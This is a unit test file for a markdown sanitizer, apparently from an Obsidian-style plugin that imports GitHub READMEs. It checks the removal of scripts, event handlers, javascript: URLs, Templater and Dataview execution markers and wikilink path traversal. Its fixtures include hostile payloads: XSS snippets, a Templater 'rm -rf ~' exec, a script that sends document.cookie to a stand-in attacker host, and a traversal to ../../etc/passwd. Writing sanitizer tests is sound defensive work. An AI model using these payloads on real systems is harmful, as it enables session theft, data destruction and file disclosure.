import {
	escapePersistMarkers,
	neutralizeDataviewInlineQueries,
	neutralizeTemplaterMarkers,
	neutralizeWikilinkDotDot,
	rewriteImgTagsToMarkdown,
	sanitizeForUserSafety,
	sanitizeForVaultIntegrity,
	sanitizeGithubMarkdown,
	stripDangerousTags,
	stripDangerousUrlSchemes,
	stripEventHandlerAttributes,
} from "./body";

describe("stripDangerousTags", () => {
	test("removes <script> tags with content", () => {
		expect(
			stripDangerousTags("before<script>alert(1)</script>after"),
		).toBe("beforeafter");
	});

	test("removes multi-line <script>", () => {
		const input = "foo\n<script>\nalert(1)\n</script>\nbar";
		expect(stripDangerousTags(input)).toBe("foo\n\nbar");
	});

	test("removes <iframe>", () => {
		expect(
			stripDangerousTags('a<iframe src="x"></iframe>b'),
		).toBe("ab");
	});

	test("removes bare / self-closing <link>", () => {
		expect(
			stripDangerousTags('<link rel="stylesheet" href="x.css">ok'),
		).toBe("ok");
	});

	test("removes <object>, <embed>, <style>, <meta>, <base>", () => {
		expect(stripDangerousTags("x<object></object>y")).toBe("xy");
		expect(stripDangerousTags("x<embed src='x'/>y")).toBe("xy");
		expect(stripDangerousTags("x<style>p{}</style>y")).toBe("xy");
		expect(stripDangerousTags("x<meta charset='utf-8'>y")).toBe("xy");
		expect(stripDangerousTags("x<base href='/'>y")).toBe("xy");
	});

	test("case-insensitive", () => {
		expect(stripDangerousTags("<SCRIPT>x</SCRIPT>")).toBe("");
		expect(stripDangerousTags("<ScRiPt>x</ScRiPt>")).toBe("");
	});

	test("safe tags passed through", () => {
		expect(stripDangerousTags("<p>hi <b>there</b></p>")).toBe(
			"<p>hi <b>there</b></p>",
		);
	});
});

describe("stripEventHandlerAttributes", () => {
	test("strips onerror on <img>", () => {
		expect(
			stripEventHandlerAttributes('<img src="x" onerror="alert(1)">'),
		).toBe('<img src="x">');
	});

	test("strips multiple event attrs", () => {
		expect(
			stripEventHandlerAttributes(
				'<div onclick="x" onmouseover=\'y\' title="ok">z</div>',
			),
		).toBe('<div title="ok">z</div>');
	});

	test("strips unquoted event handlers", () => {
		expect(
			stripEventHandlerAttributes("<div onclick=alert>x</div>"),
		).toBe("<div>x</div>");
	});

	test("case-insensitive on attribute name", () => {
		expect(
			stripEventHandlerAttributes('<img OnLoad="x" src="y">'),
		).toBe('<img src="y">');
	});

	test("non-event attrs preserved", () => {
		expect(
			stripEventHandlerAttributes('<a href="x" title="y">z</a>'),
		).toBe('<a href="x" title="y">z</a>');
	});
});

describe("stripDangerousUrlSchemes", () => {
	test("drops javascript: href", () => {
		expect(
			stripDangerousUrlSchemes('<a href="javascript:alert(1)">x</a>'),
		).toBe("<a>x</a>");
	});

	test("drops data:text/html src", () => {
		expect(
			stripDangerousUrlSchemes('<iframe src="data:text/html,<script>"'),
		).toBe("<iframe");
	});

	test("drops javascript: with whitespace + mixed case", () => {
		expect(
			stripDangerousUrlSchemes('<a href=" JavaScript: alert(1)">x</a>'),
		).toBe("<a>x</a>");
	});

	test("preserves safe data:image/png", () => {
		const input = '<img src="data:image/png;base64,AAA">';
		expect(stripDangerousUrlSchemes(input)).toBe(input);
	});

	test("preserves standard https: hrefs", () => {
		const input = '<a href="https://example.com">x</a>';
		expect(stripDangerousUrlSchemes(input)).toBe(input);
	});
});

describe("rewriteImgTagsToMarkdown", () => {
	test("rewrites simple <img src> to ![]()", () => {
		expect(rewriteImgTagsToMarkdown('<img src="x.png">')).toBe("![](x.png)");
	});

	test("preserves alt text", () => {
		expect(
			rewriteImgTagsToMarkdown('<img src="x.png" alt="a photo">'),
		).toBe("![a photo](x.png)");
	});

	test("handles single-quoted attrs", () => {
		expect(
			rewriteImgTagsToMarkdown("<img src='x.png' alt='a'>"),
		).toBe("![a](x.png)");
	});

	test("handles unquoted src", () => {
		expect(rewriteImgTagsToMarkdown("<img src=x.png>")).toBe("![](x.png)");
	});

	test("drops <img> without src", () => {
		expect(rewriteImgTagsToMarkdown('<img alt="broken">')).toBe("");
	});

	test("case-insensitive tag match", () => {
		expect(rewriteImgTagsToMarkdown("<IMG SRC='x.png'>")).toBe("![](x.png)");
	});
});

describe("neutralizeTemplaterMarkers", () => {
	test("escapes <% ... %>", () => {
		expect(neutralizeTemplaterMarkers("<% tp.file.title %>")).toBe(
			"\\<% tp.file.title %>",
		);
	});

	test("escapes <%* exec markers too", () => {
		expect(neutralizeTemplaterMarkers("<%* console.log(1) %>")).toBe(
			"\\<%* console.log(1) %>",
		);
	});

	test("escapes every occurrence in a single line", () => {
		expect(
			neutralizeTemplaterMarkers("a <% x %> b <% y %> c"),
		).toBe("a \\<% x %> b \\<% y %> c");
	});

	test("does not affect unrelated < or %", () => {
		expect(neutralizeTemplaterMarkers("a < b and 5 % 2 = 1")).toBe(
			"a < b and 5 % 2 = 1",
		);
	});
});

describe("neutralizeDataviewInlineQueries", () => {
	test("escapes `= expr` inline queries", () => {
		expect(
			neutralizeDataviewInlineQueries("count is `= this.count`"),
		).toBe("count is \\`= this.count`");
	});

	test("escapes `$= js` queries", () => {
		expect(
			neutralizeDataviewInlineQueries("js is `$= dv.current().x`"),
		).toBe("js is \\`$= dv.current().x`");
	});

	test("does not touch normal code spans", () => {
		expect(
			neutralizeDataviewInlineQueries("use `foo` to call bar"),
		).toBe("use `foo` to call bar");
	});

	test("does not touch fenced code blocks (only inline)", () => {
		const input = "```\n= not an inline query\n```";
		expect(neutralizeDataviewInlineQueries(input)).toBe(input);
	});
});

describe("neutralizeWikilinkDotDot", () => {
	test("rewrites [[../foo]] to [[./foo]]", () => {
		expect(neutralizeWikilinkDotDot("see [[../foo]] here")).toBe(
			"see [[./foo]] here",
		);
	});

	test("rewrites multiple `..` in one link", () => {
		expect(
			neutralizeWikilinkDotDot("[[../../etc/passwd]]"),
		).toBe("[[././etc/passwd]]");
	});

	test("leaves clean wikilinks alone", () => {
		expect(neutralizeWikilinkDotDot("[[some page]]")).toBe(
			"[[some page]]",
		);
	});

	test("leaves pipe-rendered links alone when no ..", () => {
		expect(neutralizeWikilinkDotDot("[[page|Alt Text]]")).toBe(
			"[[page|Alt Text]]",
		);
	});
});

describe("escapePersistMarkers", () => {
	test("escapes user persist markers", () => {
		const input = '{% persist:user "notes" %}hostile{% endpersist %}';
		const out = escapePersistMarkers(input);
		expect(out).not.toMatch(/\{%\s*persist:user\b/);
		expect(out).toContain("{\\% persist:user");
		expect(out).toContain("{\\% endpersist %}");
	});

	test("escapes template persist markers", () => {
		expect(
			escapePersistMarkers("{% persist:template \"x\" %}"),
		).toContain("{\\% persist:template");
	});

	test("does not escape unrelated `{%` sequences", () => {
		// Liquid-like tags that aren't persist markers pass through.
		expect(escapePersistMarkers("{% raw %}")).toBe("{% raw %}");
	});
});

describe("sanitizeGithubMarkdown (composite)", () => {
	test("passes through safe markdown unchanged", () => {
		const input = "# Hello\n\nA simple **paragraph** with [a link](https://example.com).";
		expect(sanitizeGithubMarkdown(input)).toBe(input);
	});

	test("defeats a combined attack (Templater + img + script)", () => {
		const hostile = [
			"# Hostile README",
			'<img src=x onerror="alert(1)">',
			"<% tp.file.exec('rm -rf ~') %>",
			"<script>fetch('//attacker/'+document.cookie)</script>",
			'{% persist:user "x" %}attacker{% endpersist %}',
		].join("\n");

		const out = sanitizeGithubMarkdown(hostile);

		// No script tag
		expect(out.toLowerCase()).not.toContain("<script");
		// No onerror attribute
		expect(out.toLowerCase()).not.toContain("onerror");
		// Templater marker is escaped, not live
		expect(out).not.toMatch(/^<%/m);
		expect(out).toContain("\\<%");
		// Persist marker is escaped
		expect(out).not.toMatch(/\{%\s*persist:user\b/);
	});

	test("empty input returns empty", () => {
		expect(sanitizeGithubMarkdown("")).toBe("");
	});

	test("preserves standard code fences", () => {
		const input = "```js\nconsole.log('hi');\n```";
		expect(sanitizeGithubMarkdown(input)).toBe(input);
	});

	test("preserves wikilinks without ..", () => {
		const input = "See [[Some Page|alt]]";
		expect(sanitizeGithubMarkdown(input)).toBe(input);
	});

	test("default-args call is byte-identical to explicit safety-on call", () => {
		// Guard against accidental reordering regressions between
		// sanitizeGithubMarkdown() and its split halves.
		const fixtures = [
			"# Hello\n\n**bold** and _italic_ with [a](https://example.com)",
			"plain text",
			"<script>alert(1)</script>",
			"<% tp.file.title %>",
			"`= this.count`",
			"[[../escape]]",
			'{% persist:user "x" %}hostile{% endpersist %}',
			[
				"# combined",
				'<img src="x" onerror="alert(1)">',
				"<% tp.file.exec('x') %>",
				"`$= dv.current()`",
				"[[../../etc]]",
				'{% persist:template "y" %}',
			].join("\n"),
		];
		for (const f of fixtures) {
			expect(sanitizeGithubMarkdown(f)).toBe(
				sanitizeGithubMarkdown(f, { disableUserSafetySanitation: false }),
			);
		}
	});
});

describe("sanitizeForUserSafety", () => {
	test("strips <script>, event handlers, javascript: URLs", () => {
		const input = [
			'<script>alert(1)</script>',
			'<a href="javascript:alert(1)" onclick="x">z</a>',
		].join("\n");
		const out = sanitizeForUserSafety(input);
		expect(out.toLowerCase()).not.toContain("<script");
		expect(out.toLowerCase()).not.toContain("onclick");
		expect(out.toLowerCase()).not.toContain("javascript:");
	});

	test("neutralizes Templater and Dataview inline queries", () => {
		const input = "<% tp.file.exec() %> and `= this.count`";
		const out = sanitizeForUserSafety(input);
		expect(out).toContain("\\<%");
		expect(out).toContain("\\`=");
	});

	test("rewrites <img> to markdown form", () => {
		expect(sanitizeForUserSafety('<img src="x.png" alt="a">')).toBe(
			"![a](x.png)",
		);
	});

	test("does NOT touch wikilink `..` or persist markers", () => {
		const input = '[[../escape]] and {% persist:user "x" %}';
		expect(sanitizeForUserSafety(input)).toBe(input);
	});

	test("empty input returns empty", () => {
		expect(sanitizeForUserSafety("")).toBe("");
	});
});

describe("sanitizeForVaultIntegrity", () => {
	test("rewrites wikilink `..` to `.`", () => {
		expect(sanitizeForVaultIntegrity("[[../secret]]")).toBe(
			"[[./secret]]",
		);
	});

	test("escapes persist-block markers", () => {
		const out = sanitizeForVaultIntegrity(
			'{% persist:user "x" %}hostile{% endpersist %}',
		);
		expect(out).not.toMatch(/\{%\s*persist:user\b/);
		expect(out).toContain("{\\% persist:user");
	});

	test("does NOT touch script / Templater / event handlers", () => {
		const input =
			'<script>x</script><% tp %>`= this.x`<a onclick="y">z</a>';
		expect(sanitizeForVaultIntegrity(input)).toBe(input);
	});

	test("empty input returns empty", () => {
		expect(sanitizeForVaultIntegrity("")).toBe("");
	});
});

describe("sanitizeGithubMarkdown with disableUserSafetySanitation", () => {
	test("toggle on bypasses script / Templater / Dataview / event handlers", () => {
		const hostile = [
			'<script>alert(1)</script>',
			"<% tp.file.exec('x') %>",
			"`= this.count`",
			'<a href="javascript:alert(1)" onerror="x">z</a>',
		].join("\n");
		const out = sanitizeGithubMarkdown(hostile, {
			disableUserSafetySanitation: true,
		});
		// User-safety passes skipped: hostile markup survives.
		expect(out.toLowerCase()).toContain("<script");
		expect(out).toContain("<% tp.file.exec('x') %>");
		expect(out).toContain("`= this.count`");
		expect(out.toLowerCase()).toContain("onerror");
	});

	test("toggle on still enforces vault-integrity passes", () => {
		const hostile =
			'[[../../../Private/Secret]] and {% persist:user "x" %}inject{% endpersist %}';
		const out = sanitizeGithubMarkdown(hostile, {
			disableUserSafetySanitation: true,
		});
		// Vault-integrity always runs.
		expect(out).not.toContain("[[../");
		expect(out).toContain("[[./");
		expect(out).not.toMatch(/\{%\s*persist:user\b/);
		expect(out).toContain("{\\% persist:user");
	});

	test("toggle off (explicit) matches default behavior", () => {
		const input =
			'<script>x</script> [[../y]] {% persist:user "z" %}body{% endpersist %}';
		expect(
			sanitizeGithubMarkdown(input, {
				disableUserSafetySanitation: false,
			}),
		).toBe(sanitizeGithubMarkdown(input));
	});

	test("toggle on returns empty for empty input", () => {
		expect(
			sanitizeGithubMarkdown("", { disableUserSafetySanitation: true }),
		).toBe("");
	});
});
